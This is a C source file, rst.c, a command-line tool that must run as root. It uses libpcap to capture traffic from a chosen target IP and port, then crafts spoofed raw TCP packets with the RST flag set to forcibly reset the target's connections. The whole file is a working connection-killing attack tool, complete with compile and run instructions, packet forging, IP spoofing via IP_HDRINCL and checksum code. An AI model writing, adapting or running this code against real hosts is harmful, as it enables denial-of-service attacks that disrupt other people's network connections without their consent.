#define __USE_BSD
#include <netinet/ip.h>
#define __FAVOR_BSD
#include <netinet/tcp.h>

/**********************************************
*
* rst.c - sends a single packet with rst flag
* set to reset connection at a user specified
* host and port #.
*
* Compile: gcc -o rst rst.c -lpcap
* Run: rst -a [IP] -i [iface] -p [port]
* must run as root
*
**********************************************/

#define PROGRAMNAME "rst"
#define VERSION "0.1"
#define CAPTURE_LEN  1024
#define COPY_WAIT    512
#define MAX_FILTER_LENGTH 50

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>

/*************************************
 * pseudo header info found on p.145 of
 * TCP/IP Illustrated Vol. 1
 **************************************/
typedef struct tcp_pseudo_header {

	uint32_t sourceAddr;
	uint32_t destAddr;
	u_char zero;
	u_char protocol;
	uint16_t length;

} tcpPseudoHdr;

/* function prototypes to move to header */
void do_usage(void);
void sniff(char *, char *, int);
void buildAndKill(uint32_t, uint32_t, int, int, uint32_t);
uint16_t checksum(uint16_t *, int);


int main(int argc, char* argv[]) {

	int c;					/* c is used for command line argument parsing only */
	char* interface;			/* network interface to use */
	char* ipaddress;			/* ip address to reset */
	ushort port;				/* port to reset */
	if(argc < 3){
		do_usage();
		exit(1);
	}

	/* holds command line arguments */
	static struct option longopts[] =
	{
		{"help", no_argument, NULL, 'h'},
		{"address", required_argument, NULL, 'a'},
		{"port", required_argument, NULL, 'p'},
		{"interface", required_argument, NULL, 'i'},
		{"version", no_argument, NULL, 'v'},
		{0, 0, 0, 0}	
	};

	if(argc < 3){
		do_usage();
		exit(1);
	}

	/* process comand line arguments */
	while ((c = getopt_long(argc, argv, "a:hi:p:v", longopts, NULL)) != -1) {

		switch(c) {

			case 'a':
				/* set ip address */
				ipaddress = optarg;
				break;

			case 'i':
				/* set interface to listen and send packet on */
				interface = optarg;
				break;

			case 'p':
				/* set port */
				port = atoi(optarg);
				break;

			case 'v':
				/* display version info and exit */
				printf("%s %s\n", PROGRAMNAME, VERSION);
				exit(0);

			case 'h':
			case '?':
				/* display usage info to user*/
				do_usage();
				exit(0);

		}

	}

	/* display target info to user */
	printf("Interface:\t%s\n", interface);
	printf("Target IP Address:\t%s\n", ipaddress);
	printf("Target Port:\t\t%d\n", port);

	/* pass interface, ip and port # */
	sniff(interface, ipaddress, port);
	return(0);

}

/* need to pass interface, ip and port # */
void sniff(char *d, char *a, int p) {

	char errbuf[PCAP_ERRBUF_SIZE]; 			/* used to hold error messages from pcap library */
	char *dev = d; 					/* interface to capture packets on (i.e. eth0) */
	char *ipaddr = a;				/* ip address we're going to reset */
	char filter[MAX_FILTER_LENGTH];			/* filter string */
	pcap_t *handle = NULL; 				/* handle used to capture packets */
	struct pcap_pkthdr header; 			/* holds information of packet (i.e. length, timestamp) */
	struct bpf_program fe; 				/* holds compiled filter expression */
	const u_char *packet = NULL; 			/* holds the packet */
	bpf_u_int32 netaddr = 0, netmask = 0; 		/* holds network address and netmask of our caputure device */
	struct tcphdr *tcphdr = NULL;			/* struct for tcp header */
	struct iphdr *iphdr = NULL;
	memset(errbuf, 0, PCAP_ERRBUF_SIZE);

	/* create the string to hold the pcap filter */
	snprintf(filter, MAX_FILTER_LENGTH,"(tcp src port %d) and (src net %s)", p, ipaddr);
	fprintf(stdout, "%s\n", filter);

	
	/* find the netaddr and netmask of the device */
	if(pcap_lookupnet(dev, &netaddr, &netmask, errbuf) == -1) {
		fprintf(stderr,"Could not get netmask for device: %s", errbuf);
	}

 	/* set the device in promiscous mode and open for capture */
	if((handle = pcap_open_live(dev, CAPTURE_LEN, 1, COPY_WAIT, errbuf)) == NULL){
		fprintf(stderr,"Could not open device: %s",errbuf);
		return;
	}

	/* compile and set the filter rules that will be used to determine which packets we want to record */
	if(pcap_compile(handle, &fe, filter, 1, netmask) == -1){
		fprintf(stderr,"Could not compile filter: %s", pcap_geterr(handle));
		return;
	}

	if(pcap_setfilter(handle, &fe) == -1){
		fprintf(stderr, "Could not set filter: %s", pcap_geterr(handle)); 
		return;
	}

    while (1) {

        /* get the next packet */
        if((packet = pcap_next(handle, &header)) != NULL) {

            /* set the headers for each layer */
            iphdr = (struct iphdr *)(packet + 14);
            tcphdr = (struct tcphdr *)(packet + 34);

            char *buf = malloc(INET_ADDRSTRLEN);
            fprintf(stdout, "src = %s\n", inet_ntop(AF_INET, iphdr->saddr, buf, INET_ADDRSTRLEN));
            fprintf(stdout, "dst = %s\n", inet_ntop(AF_INET, iphdr->daddr, buf, INET_ADDRSTRLEN));


            /* build and launch the packet */
            buildAndKill(iphdr->daddr, iphdr->saddr, ntohs(tcphdr->th_sport), ntohs(tcphdr->th_dport), htonl((ntohl(tcphdr->th_seq)+1)));
        } else {
        //    fprintf(stderr,"No packet read\n");
        }

    }

	/* close the session */
	pcap_close(handle);

}


/****************************************************
* construct a raw IP TCP packet and send it to target_ip 
* on targetPort with sequenceNo and RST flag
******************************************************/
//void buildAndKill(char *target_ip, int targetPort, int sequenceNo){
void buildAndKill(uint32_t source_ip, uint32_t target_ip, int targetPort, int sourcePort, uint32_t sequenceNo){

   	/* socket descriptor */
	int raw_socket = 0;
	/* buffer to hold entire packet ip header + tcp header */
	char rstPacket[sizeof(struct tcphdr) + sizeof(struct ip) +1];	
	/* ip header fields, from netinet/ip.h */
	struct ip *iph = (struct ip *)rstPacket;
	/* holds tcp fields, from netinet/tcp.h */
	struct tcphdr *tcph = (struct tcphdr *) (rstPacket + sizeof(struct ip));
	
	/* used to compute the tcp checksum */
	tcpPseudoHdr tcpPH;
	char tcpChkSum[sizeof(tcpPseudoHdr) + 20];

   	/* this structure is required by sendto() */
   	struct sockaddr_in desthost;
	
	memset(&rstPacket, 0, sizeof(rstPacket));
	memset(&tcpPH, 0, sizeof(tcpPseudoHdr));
	memset(&desthost, 0, sizeof(desthost));

	/* this sturct is required by sendto() */
	desthost.sin_family = AF_INET;
	desthost.sin_port = targetPort;
	desthost.sin_addr.s_addr = target_ip;

   	//protocol IPPROTO_RAW implies use of IP_HDRINCL
   	//sockDesc = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if ((raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "Cannot obtain socket descriptor\n");
		exit(-1);
   	}

   	//setsockopt(int s, int level, int optname, const void *optval, socklen_t optlen);
   	/* optVal set to 1 -  p736 UNIX Network Programming... */
	int optVal = 1;
	if(setsockopt(raw_socket,  IPPROTO_IP, IP_HDRINCL, &optVal, sizeof(optVal)) < 0) {
		fprintf(stderr, "IP spoofing forbidden.\n");
		exit(-1);
	}

	/* complete IP header... */
	iph->ip_hl = 5;						// header length
	iph->ip_v = 4;						// ip version
	iph->ip_tos = 0;					// type of service, 0 = default
	iph->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
	iph->ip_id = htons(1);					// id seq # for fragmented IP dgrams
	iph->ip_off = 0;					// fragment offset
	iph->ip_ttl = 64;					// time to live
	iph->ip_p = 6;						// transport layer proto, tcp=6	
	iph->ip_sum = 0;					// calculate this below
	iph->ip_src.s_addr = source_ip;				// source IP
	iph->ip_dst.s_addr = target_ip;				// destination IP

	//desthost.sin_addr.s_addr = iph->ip_dst.s_addr; //inet_addr(target_ip);

	/* build the tcp header now.. */
   	tcph->th_seq = sequenceNo;				// sequence # already incremented by 1
	tcph->th_ack = htonl(1);				// ACK flag set
	tcph->th_x2 = 0;					// 
	tcph->th_off = 5;					// fragmented or not
	tcph->th_flags = TH_RST | TH_ACK;				// RST flag set
	tcph->th_win = htons(4500) + rand()%1000;		// random window size
	tcph->th_urp = 0;					// urgent pointer
   	tcph->th_sport = sourcePort;				// source port htons()
	tcph->th_dport = targetPort;				// target/dest port htons()
	tcph->th_sum = 0;					// tcp checksum calculated below


	/* tcp pseudo header used to calculate the tcp checksum */
	tcpPH.sourceAddr = iph->ip_src.s_addr;				// source address
	tcpPH.destAddr = iph->ip_dst.s_addr;				// destination address
	tcpPH.zero = 0;							// zero
	tcpPH.protocol = iph->ip_p;					// tcp = 6
	tcpPH.length = htons(sizeof(struct tcphdr));			// sizeof struct

	/* copy the pseudo header in to calculate the checksum */
	memcpy(tcpChkSum, &tcpPH, sizeof(tcpPseudoHdr));
	memcpy(tcpChkSum+sizeof(tcpPseudoHdr), tcph, sizeof(struct tcphdr));

	/* calculate the checksums, tcp first, then ip */
	tcph->th_sum = checksum((unsigned short *)tcpChkSum, sizeof(tcpChkSum));
	iph->ip_sum = checksum((unsigned short *)iph, sizeof(struct ip));

	/* send the packet and kill something */
	fprintf(stdout, "about to send the packet\n");

	if(sendto(raw_socket, rstPacket, ntohs(iph->ip_len), 0, (struct sockaddr *)&desthost, sizeof(desthost)) < 0){
		fprintf(stderr, "sending packet failed...\n");
	}

   	fprintf(stdout, "RST Packet sent to:\n");
	fprintf(stdout, "\tIP Address: %s\n", inet_ntoa(iph->ip_dst));
	fprintf(stdout, "\tPort #: %i\n", ntohs(tcph->th_dport));
	fprintf(stdout, "\tSequence #: %u\n", ntohl(tcph->th_seq));
	

}

/* this calculates the checksum for the ip header and the tcp header */
/* originally found on p753 "UNIX Network Programming" */
uint16_t checksum(uint16_t * addr, int len) {

	int nleft = len;
	uint32_t sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);

}

/* display usage information to user */
void do_usage() {

	printf("REQUIRED OPTIONS:\n");
	printf("\t[-a | --address] [ip address]\t\t: specify ip address\n");
	printf("\t[-i | --interface] [network interface]\t: specify interface to use\n");
	printf("\t[-p | --port] [n]\t\t\t: specify port number\n");
	printf("USAGE AND VERSION OPTIONS:\n");
	printf("\t[-h | --help]\t\t\t\t: display help information\n");
	printf("\t[-v | --version]\t\t\t: display version information\n");

}
